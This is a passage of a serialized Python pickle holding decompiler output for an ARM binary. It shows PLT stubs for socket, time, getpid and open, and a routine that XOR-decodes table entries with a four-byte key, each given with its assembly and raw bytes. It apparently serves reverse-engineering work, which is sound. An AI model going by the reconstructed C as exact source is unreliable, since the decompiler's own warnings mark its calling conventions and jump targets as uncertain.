V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint socket(int __domain,int __type,int __protocol)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008934. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132b0)();\u000a  return iVar1;\u000a}\u000a\u000a
p451
S'adr r12,0x8934\nadd r12,r12,#0xa000\nldr pc,[r12,#0x97c]!\n'
p452
S'00 c6 8f e2\n0a ca 8c e2\n7c f9 bc e5\n'
p453
S'.plt:0000892c\n.plt:00008930\n.plt:00008934\n'
p454
tp455
sS'time'
p456
(S'\n__stdcall time(time_t * __timer)\n'
p457
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000atime_t time(time_t *__timer)\u000a\u000a{\u000a  time_t tVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a00. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  tVar1 = (*(code *)PTR_LAB_000132f4)();\u000a  return tVar1;\u000a}\u000a\u000a
p458
S'adr r12,0x8a00\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8f4]!\n'
p459
S'00 c6 8f e2\n0a ca 8c e2\nf4 f8 bc e5\n'
p460
S'.plt:000089f8\n.plt:000089fc\n.plt:00008a00\n'
p461
tp462
sS'FUN_0000a59c'
p463
(S'\n__stdcall FUN_0000a59c()\n'
p464
V\u000avoid FUN_0000a59c(int iParm1)\u000a\u000a{\u000a  int *piVar1;\u000a  undefined4 uVar2;\u000a  int iVar3;\u000a  \u000a  piVar1 = (int *)(PTR_DAT_0000a634 + iParm1 * 8);\u000a  uVar2 = *(undefined4 *)PTR_DAT_0000a638;\u000a  if (*(short *)(piVar1 + 1) != 0) {\u000a    iVar3 = 0;\u000a    do {\u000a      *(byte *)(iVar3 + *piVar1) = (byte)uVar2 ^ *(byte *)(iVar3 + *piVar1);\u000a      *(byte *)(iVar3 + *piVar1) = (byte)((uint)uVar2 >> 8) ^ *(byte *)(iVar3 + *piVar1);\u000a      *(byte *)(iVar3 + *piVar1) = (byte)((uint)uVar2 >> 0x10) ^ *(byte *)(iVar3 + *piVar1);\u000a      *(byte *)(iVar3 + *piVar1) = (byte)((uint)uVar2 >> 0x18) ^ *(byte *)(iVar3 + *piVar1);\u000a      iVar3 = iVar3 + 1;\u000a    } while (iVar3 < (int)(uint)*(ushort *)(piVar1 + 1));\u000a  }\u000a  return;\u000a}\u000a\u000a
p465
S'ldr r3,[0xa634]\nldr r2,[0xa638]\nmov r0,r0, lsl #0x3\nadd r0,r0,r3\nldr r1,[r2,#0x0]\nldrh r3,[r0,#0x4]\nmov r2,r1, lsr #0x8\ncmp r3,#0x0\nmov r3,r1, lsr #0x10\nstmdb sp!,{ r4 r5 r6 lr }\nand r6,r2,#0xff\nand r5,r3,#0xff\nmov r4,r1, lsr #0x18\nand lr,r1,#0xff\nbeq 0x0000a62c\nmov r12,#0x0\nldr r2,[r0,#0x0]\nldrb r3,[r12,r2]\neor r3,lr,r3\nstrb r3,[r12,r2]\nldr r1,[r0,#0x0]\nldrb r3,[r12,r1]\neor r3,r6,r3\nstrb r3,[r12,r1]\nldr r2,[r0,#0x0]\nldrb r3,[r12,r2]\neor r3,r5,r3\nstrb r3,[r12,r2]\nldr r1,[r0,#0x0]\nldrb r3,[r12,r1]\neor r3,r4,r3\nstrb r3,[r12,r1]\nldrh r2,[r0,#0x4]\nadd r12,r12,#0x1\ncmp r2,r12\nbgt 0x0000a5dc\nldmia sp!,{ r4 r5 r6 lr }\nbx lr\n'
p466
S'90 30 9f e5\n90 20 9f e5\n80 01 a0 e1\n03 00 80 e0\n00 10 92 e5\nb4 30 d0 e1\n21 24 a0 e1\n00 00 53 e3\n21 38 a0 e1\n70 40 2d e9\nff 60 02 e2\nff 50 03 e2\n21 4c a0 e1\nff e0 01 e2\n14 00 00 0a\n00 c0 a0 e3\n00 20 90 e5\n02 30 dc e7\n03 30 2e e0\n02 30 cc e7\n00 10 90 e5\n01 30 dc e7\n03 30 26 e0\n01 30 cc e7\n00 20 90 e5\n02 30 dc e7\n03 30 25 e0\n02 30 cc e7\n00 10 90 e5\n01 30 dc e7\n03 30 24 e0\n01 30 cc e7\nb4 20 d0 e1\n01 c0 8c e2\n0c 00 52 e1\neb ff ff ca\n70 40 bd e8\n1e ff 2f e1\n'
p467
S'.text:0000a59c\n.text:0000a5a0\n.text:0000a5a4\n.text:0000a5a8\n.text:0000a5ac\n.text:0000a5b0\n.text:0000a5b4\n.text:0000a5b8\n.text:0000a5bc\n.text:0000a5c0\n.text:0000a5c4\n.text:0000a5c8\n.text:0000a5cc\n.text:0000a5d0\n.text:0000a5d4\n.text:0000a5d8\n.text:0000a5dc\n.text:0000a5e0\n.text:0000a5e4\n.text:0000a5e8\n.text:0000a5ec\n.text:0000a5f0\n.text:0000a5f4\n.text:0000a5f8\n.text:0000a5fc\n.text:0000a600\n.text:0000a604\n.text:0000a608\n.text:0000a60c\n.text:0000a610\n.text:0000a614\n.text:0000a618\n.text:0000a61c\n.text:0000a620\n.text:0000a624\n.text:0000a628\n.text:0000a62c\n.text:0000a630\n'
p468
tp469
sS'getpid'
p470
(S'\n__stdcall getpid()\n'
p471
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t getpid(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008904. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_000132a0)();\u000a  return _Var1;\u000a}\u000a\u000a
p472
S'adr r12,0x8904\nadd r12,r12,#0xa000\nldr pc,[r12,#0x99c]!\n'
p473
S'00 c6 8f e2\n0a ca 8c e2\n9c f9 bc e5\n'
p474
S'.plt:000088fc\n.plt:00008900\n.plt:00008904\n'
p475
tp476
sS'open'
p477
(S'\n__stdcall open(char * __file, int __oflag)\n'
p478
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint open(char *__file,int __oflag,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a30. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013304)();\u000a  return iVar1;\u000a}\u000a\u000a
p479
S'adr r12,0x8a30\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8d4]!\n'
p480
S'00 c6 8f e2\n0a ca 8c e2\nd4 f8 bc e5\n'
p481
S'.plt:00008a28\n.plt:00008a2c\n.plt:00008a30\n'
p482
tp483
s.